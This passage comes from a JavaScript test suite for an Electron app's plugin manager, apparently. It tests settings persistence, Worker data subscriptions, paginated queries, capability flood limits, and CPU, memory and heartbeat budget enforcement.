  assert.equal(env.running.size, 0);
  env.manager.reload();
  assert.notEqual(env.manager.webDocument('pulse/models').revision, revision);
});


test('committed settings survive failing observers and author DTOs omit schema', t => {
  const { createPluginSettingsStore } = require('../../src/electron/plugins/settings');
  const directory = fs.mkdtempSync(path.join(os.tmpdir(), 'tm-settings-observers-'));
  const store = createPluginSettingsStore({ directory });
  const manifest = { ...CODE, settings: { version: 1, fields: [{ id: 'count', type: 'number', label: 'Count', default: 1 }] } };
  const env = setup({ plugins: [manifest], authorSettings: store });
  t.after(() => { env.manager.dispose(); fs.rmSync(directory, { recursive: true, force: true }); fs.rmSync(env.root, { recursive: true, force: true }); });
  const received = [];
  env.manager.onAuthorSettings(() => { throw new Error('observer failure'); });
  env.manager.onAuthorSettings((_id, value) => received.push(value));
  const result = env.manager.updateAuthorSettings('pulse', { schemaVersion: 1, expectedRevision: 0, patch: { count: 3 } });
  assert.equal(result.revision, 1); assert.ok(result.schema);
  assert.equal(env.manager.getAuthorSettings('pulse').values.count, 3);
  assert.equal(received.length, 1); assert.equal(received[0].schema, undefined);
  assert.deepEqual(received[0], env.manager.getPublicAuthorSettings('pulse'));
  const beforeDispose = fs.readFileSync(path.join(directory, 'pulse.json'));
  env.manager.dispose();
  assert.throws(() => env.manager.updateAuthorSettings('pulse', {schemaVersion:1,expectedRevision:1,patch:{count:9}}), /unavailable/);
  assert.deepEqual(fs.readFileSync(path.join(directory, 'pulse.json')), beforeDispose);
});

test('fallback settings identity follows the actual discovered directory and survives routine reload', t => {
  const env = setup();
  t.after(() => { env.manager.dispose(); fs.rmSync(env.root, { recursive: true, force: true }); });
  fs.renameSync(path.join(env.userDir, 'pulse'), path.join(env.userDir, 'development-folder'));
  env.manager.reload();
  const before = env.plugin('pulse').settingsIdentity;
  const revision = env.plugin('pulse').webRevision;
  assert.match(before, /^[a-f0-9]{64}$/);
  env.manager.reload(); assert.equal(env.plugin('pulse').settingsIdentity, before);
  assert.notEqual(env.plugin('pulse').webRevision, revision);
  env.manager.setEnabled('pulse', true); assert.equal(env.plugin('pulse').settingsIdentity, before);
  fs.writeFileSync(path.join(env.userDir, 'development-folder', 'manifest.json'), JSON.stringify({ ...CODE, version: '1.0.1' }));
  env.manager.reload(); assert.notEqual(env.plugin('pulse').settingsIdentity, before);
});

test('Worker business subscriptions release on idle and re-register after resume; late queries never succeed', async t => {
  const { createPluginCapabilities } = require('../../src/electron/plugins/capabilities');
  const { createBusinessDataService } = require('../../src/electron/plugins/businessData');
  let finish;
  const business = createBusinessDataService({ loadHistory: () => new Promise(resolve => { finish = resolve; }) });
  business.publish({});
  const capabilities = createPluginCapabilities({ businessData: business });
  const env = setup({ plugins: [{ ...CODE, permissions: ['tm.data.history'] }], capabilities });
  t.after(() => { env.manager.dispose(); capabilities.dispose(); business.dispose(); fs.rmSync(env.root, { recursive: true, force: true }); });
  env.manager.setEnabled('pulse', true); env.manager.setSurfaceDemand('notch', ['pulse/pulse']); env.manager.handleMessage('pulse', { type: 'ready' });
  const query = { version: 1, resource: 'history' };
  env.manager.handleMessage('pulse', { type: 'call', id: 100, op: 'data.query', args: { query } });
  await new Promise(resolve => setImmediate(resolve)); assert.equal(typeof finish, 'function');
  env.manager.setSurfaceDemand('notch', []);
  env.manager.setSurfaceDemand('notch', ['pulse/pulse']);
  finish({ daily: [], monthly: [], summary: {} }); await new Promise(resolve => setImmediate(resolve));
  assert.equal(env.sent.some(([, value]) => value.type === 'result' && value.id === 100 && value.ok), false);
  env.manager.handleMessage('pulse', { type: 'call', id: 101, op: 'data.subscribe', args: { id: 'history', query } });
  await new Promise(resolve => setImmediate(resolve));
  assert.ok(env.sent.some(([, value]) => value.type === 'business-data' && value.id === 'history'));
  env.manager.setSurfaceDemand('notch', []); const count = env.sent.length;
  business.publish({}); await new Promise(resolve => setTimeout(resolve, 120));
  assert.equal(env.sent.slice(count).some(([, value]) => value.type === 'business-data'), false);
});

for (const limit of [1, 100]) test(`Worker manager traverses all 2000 rows at limit ${limit} with mixed settings traffic`, { timeout: 60000 }, async t => {
  const { createBusinessDataService } = require('../../src/electron/plugins/businessData');
  const { createPluginCapabilities } = require('../../src/electron/plugins/capabilities');
  const { createPluginSettingsStore } = require('../../src/electron/plugins/settings');
  const business = createBusinessDataService();
  business.publish({ periods: { today: { sessions: Object.fromEntries(Array.from({ length: 2000 }, (_, i) => [i, { sessionId: String(i), client: 'codex', totalTokens: i, title: `Row ${i}` }])) } } });
  const capabilities = createPluginCapabilities({ businessData: business });
  const env = setup({ realTime: true, capabilities, plugins: [{ ...CODE, permissions: ['tm.data.sessions', 'tm.data.identities'], settings: { version: 1, fields: [{ id: 'count', type: 'number', label: 'Count', default: 1 }] } }], authorSettings: createPluginSettingsStore({ directory: path.join(os.tmpdir(), `tm-unused-settings-${process.pid}`) }) });
  t.after(() => { env.manager.dispose(); env.bus.dispose(); capabilities.dispose(); business.dispose(); fs.rmSync(env.root, { recursive: true, force: true }); });
  env.manager.setEnabled('pulse', true); env.manager.setSurfaceDemand('notch', ['pulse/pulse']); env.manager.handleMessage('pulse', { type: 'ready' });
  // Exercise the actual trusted host relay too: only the browser Worker primitive
  // is faked. Requests cross its validator/slot ledger, main manager and adapter;
  // matching main replies release host slots before reaching the author.
  const vm = require('node:vm');
  let receive, worker, id = 0;
  const waiting = new Map();
  class Worker {
    constructor() { worker = this; }
    terminate() {}
    postMessage(message) {
      if (message.type === 'result') { waiting.get(message.id)?.(message); waiting.delete(message.id); }
    }
  }
  const context = vm.createContext({ window: { tmPluginHost: { send: message => env.manager.handleMessage('pulse', structuredClone(message)), onMessage: fn => { receive = fn; } } },
    Worker, Blob, URL, TextEncoder, performance, setInterval() {} });
  const host = path.resolve(__dirname, '../../src/electron/plugins/host');
  for (const file of ['message.js', 'runtime.js']) vm.runInContext(fs.readFileSync(path.join(host, file), 'utf8'), context);
  receive({ type: 'boot', source: '' }); context.deliver = message => worker.onmessage({ data: message });
  const originalSend = env.sandbox.send;
  env.sandbox.send = (pluginId, message) => { const sent = originalSend(pluginId, message); if (sent) receive(message); return sent; };
  t.after(() => receive({ type: 'stop' }));
  async function call(op, args) {
    const requestId = ++id;
    const pending = new Promise(resolve => waiting.set(requestId, resolve));
    context.raw = JSON.stringify({ type: 'call', id: requestId, op, args });
    vm.runInContext('deliver(JSON.parse(raw))', context);
    const result = await pending;
    assert.equal(result.ok, true, JSON.stringify(result)); return result.value;
  }
  let cursor, pages = 0;
  const rows = [], start = Date.now();
  do {
    const result = await call('data.query', { query: { version: 1, resource: 'sessions', sort: { field: 'totalTokens' }, page: { limit, ...(cursor ? { cursor } : {}) } } });
    assert.equal(result.availability, 'available'); assert.ok(Buffer.byteLength(JSON.stringify(result)) <= 56 * 1024);
    rows.push(...result.rows); cursor = result.pageInfo.nextCursor; pages++;
    const settings = await call('settings.get', {}); assert.equal(settings.values.count, 1);
  } while (cursor);
  assert.equal(rows.length, 2000); assert.equal(new Set(rows.map(row => row.id)).size, 2000);
  assert.deepEqual(rows.map(row => row.totalTokens), Array.from({ length: 2000 }, (_, i) => i));
  assert.ok(Date.now() - start < 60000); assert.equal(env.events.some(e => e[0] === 'kill'), false);
  t.diagnostic(`${pages} pages plus settings replies in ${Date.now() - start}ms`);
});

test('Worker concurrent capability flood is bounded and cancels queued queries on teardown', async t => {
  const { createPluginCapabilities } = require('../../src/electron/plugins/capabilities');
  let starts = 0, finish;
  const capabilities = createPluginCapabilities({ businessData: { query() { starts++; return new Promise(resolve => { finish = resolve; }); }, releaseOwner() {} } });
  const env = setup({ capabilities, plugins: [{ ...CODE, permissions: ['tm.data.sessions'] }] });
  t.after(() => { env.manager.dispose(); env.bus.dispose(); capabilities.dispose(); fs.rmSync(env.root, { recursive: true, force: true }); });
  env.manager.setEnabled('pulse', true); env.manager.setSurfaceDemand('notch', ['pulse/pulse']); env.manager.handleMessage('pulse', { type: 'ready' });
  const send = id => env.manager.handleMessage('pulse', { type: 'call', id, op: 'data.query', args: { query: { version: 1, resource: 'sessions' } } });
  send(1); await new Promise(resolve => setImmediate(resolve));
  for (let i = 2; i <= 1000; i++) send(i);
  assert.equal(starts, 1); assert.equal(env.events.filter(e => e[0] === 'kill').length, 1);
  finish({ rows: ['late'] }); await new Promise(resolve => setImmediate(resolve));
  assert.equal(starts, 1); assert.equal(env.sent.some(([, m]) => m.type === 'result' && m.ok), false);
});


test('metrics sampling notifies only changed readings and preserves budget kills', async (t) => {
  const env = setup();
  t.after(() => env.manager.dispose());
  env.manager.setEnabled('pulse', true);
  env.manager.setSurfaceDemand('home', ['pulse/pulse']);
  env.manager.handleMessage('pulse', { type: 'ready' });
  let changes = 0;
  env.manager.onChanged(() => { changes += 1; });
  const sample = async () => {
    const tick = env.sent.filter(([, message]) => message.type === 'tick').at(-1)?.[1];
    if (tick) env.manager.handleMessage('pulse', { type: 'tick-done', seq: tick.seq });
    env.manager.handleMessage('pulse', { type: 'heartbeat' });
    await env.clock.advance(5_000);
  };
  await sample();
  assert.equal(changes, 0, 'missing metrics remain a no-op');
  env.sandbox.metrics = () => ({ pulse: { cpuPercent: 2, memoryMB: 10 } });
  await sample();
  assert.equal(changes, 1, 'first actual readings notify');
  await sample();
  assert.equal(changes, 1, 'equal fresh objects do not notify');
  env.sandbox.metrics = () => ({ pulse: { cpuPercent: 3, memoryMB: 10 } });
  await sample();
  assert.equal(changes, 2, 'CPU changes notify');
  env.sandbox.metrics = () => ({});
  await sample();
  assert.equal(changes, 3, 'loss of readings notifies');
  env.sandbox.metrics = () => ({ pulse: { cpuPercent: 3, memoryMB: 300 } });
  await sample();
  assert.ok(env.events.some(([kind, , reason]) => kind === 'kill' && reason === 'over-memory-budget'));
  assert.ok(changes > 3, 'kill/status transition remains observable');
});


test('unchanged CPU samples still enforce sustained budgets and notify the kill', async (t) => {
  const env = setup();
  t.after(() => env.manager.dispose());
  env.manager.setEnabled('pulse', true);
  env.manager.setSurfaceDemand('home', ['pulse/pulse']);
  env.manager.handleMessage('pulse', { type: 'ready' });
  env.sandbox.metrics = () => ({ pulse: { cpuPercent: 30, memoryMB: 10 } });
  let changes = 0;
  env.manager.onChanged(() => { changes += 1; });
  for (let i = 0; i < 2; i += 1) {
    env.manager.handleMessage('pulse', { type: 'heartbeat' });
    await env.clock.advance(5_000);
  }
  assert.equal(changes, 1);
  env.manager.handleMessage('pulse', { type: 'heartbeat' });
  await env.clock.advance(5_000);
  assert.ok(env.events.some(([kind, , reason]) => kind === 'kill' && reason === 'over-cpu-budget'));
  assert.ok(changes > 1);
});

test('absent metrics still enforce heartbeats and notify status changes', async (t) => {
  const env = setup();
  t.after(() => env.manager.dispose());
  env.manager.setEnabled('pulse', true);
  env.manager.setSurfaceDemand('home', ['pulse/pulse']);
  env.manager.handleMessage('pulse', { type: 'ready' });
  let changes = 0;
  env.manager.onChanged(() => { changes += 1; });
  await env.clock.advance(10_000);
  assert.equal(changes, 0);
  await env.clock.advance(5_000);
  assert.ok(env.events.some(([kind, , reason]) => kind === 'kill' && reason === 'no-heartbeat'));
  assert.ok(changes > 0);
  assert.equal(env.plugin('pulse').runtime.state, 'backoff');
});

test('surface catalog tracks authoritative availability without building the settings catalog', (t) => {
  const env = setup();
  t.after(() => env.manager.dispose());
  assert.deepEqual(env.manager.surfaceCatalog('edgeDock'), []);
  env.manager.setEnabled('sys-view', true);
  assert.deepEqual(env.manager.surfaceCatalog('edgeDock'), [{ ref: 'sys-view/cpu', title: 'CPU', icon: 'dot' }]);
  const refs = env.manager.surfaceCatalog('edgeDock');
  refs.length = 0;
  assert.deepEqual(env.manager.surfaceCatalog('edgeDock'), [{ ref: 'sys-view/cpu', title: 'CPU', icon: 'dot' }]);
  assert.deepEqual(env.manager.surfaceCatalog('notch'), []);
  env.setSettings({ pluginsEnabled: false });
  assert.deepEqual(env.manager.surfaceCatalog('edgeDock'), []);
  env.setSettings({ pluginsEnabled: true });
  env.manager.beginMutation();
  assert.deepEqual(env.manager.surfaceCatalog('edgeDock'), []);
  env.manager.endMutation();
  assert.deepEqual(env.manager.surfaceCatalog('edgeDock'), [{ ref: 'sys-view/cpu', title: 'CPU', icon: 'dot' }]);
  env.manager.setEnabled('sys-view', false);
  assert.deepEqual(env.manager.surfaceCatalog('edgeDock'), []);
  env.manager.dispose();
  assert.deepEqual(env.manager.surfaceCatalog('edgeDock'), []);
});
